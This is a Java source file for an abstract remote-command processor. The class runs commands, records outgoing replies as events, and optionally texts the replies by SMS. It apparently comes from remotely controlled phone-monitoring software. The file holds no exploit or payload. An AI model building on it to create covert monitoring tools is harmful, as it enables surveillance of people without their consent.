package com.vvt.remotecommandmanager.processor;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.events.FxEventDirection;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.CommandProcessingListener;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public abstract class RemoteCommandProcessor {
	
	private static final String TAG = "RemoteCommandProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private CommandProcessingListener mCmdProcessingListener;
	private FxEventRepository mEventRepository;

	private AppContext mAppContext;
	
	public RemoteCommandProcessor (AppContext appContext, FxEventRepository eventRepository) {
		mEventRepository = eventRepository;
		mAppContext = appContext;
	}
	
	public void processCommand(RemoteCommandData commandData) { 
		if(LOGV) FxLog.v(TAG, "processCommand # ENTER ...");
		try {
			
			doProcessCommand(commandData);
			ProcessingResult replyMessage = getReplyMessage();
			String recipientNumber = getRecipientNumber();
			
			String gReplyMessage = RemoteCommandUtil.generateReplyMessage(
					mAppContext.getProductInfo(), commandData.getCommandCode(), replyMessage);
			
			if(LOGD) FxLog.d(TAG,String.format("processCommand # recipientNumber : %s" +
					"\nReplyMessage : %s" ,recipientNumber,gReplyMessage));
			
			RemoteCommandUtil.createSystemEvent(mEventRepository,
					commandData.getRmtCommandType(), FxEventDirection.OUT,gReplyMessage);
			
			if(LOGD) FxLog.d(TAG, "processCommand # isSmsReplyRequired : " + commandData.isSmsReplyRequired());
			if(commandData.isSmsReplyRequired()) {
				RemoteCommandUtil.sendReplySms(recipientNumber, gReplyMessage);
			}

		} catch (Exception e) {
			if(LOGE) FxLog.e(TAG, "processCommand # Have exception ...");
			if (e instanceof RemoteCommandException) {
				RemoteCommandException commandException = (RemoteCommandException)e;
				if(LOGE) FxLog.e(TAG, commandException.getMessage());
				RemoteCommandUtil.handleException(mEventRepository,commandException, commandData,mAppContext.getProductInfo());
				
			} else {
				if(LOGE) FxLog.e(TAG, e.getMessage(),e);
			}
			
		} finally {
			if(mCmdProcessingListener != null)
				mCmdProcessingListener.onProcessFinish(commandData);
		}
		if(LOGV) FxLog.v(TAG, "processCommand # EXIT ...");
	}
	
	public void setProcessingListener(CommandProcessingListener cmdProcessingListener) {
		mCmdProcessingListener = cmdProcessingListener;
	}
	
	public CommandProcessingListener getProcessingListener() {
		return mCmdProcessingListener;
	}
	
	public abstract ProcessingType getProcessingType();
	protected abstract void doProcessCommand(RemoteCommandData commandData) throws RemoteCommandException;
	protected abstract String getRecipientNumber();
	protected abstract ProcessingResult getReplyMessage();

}
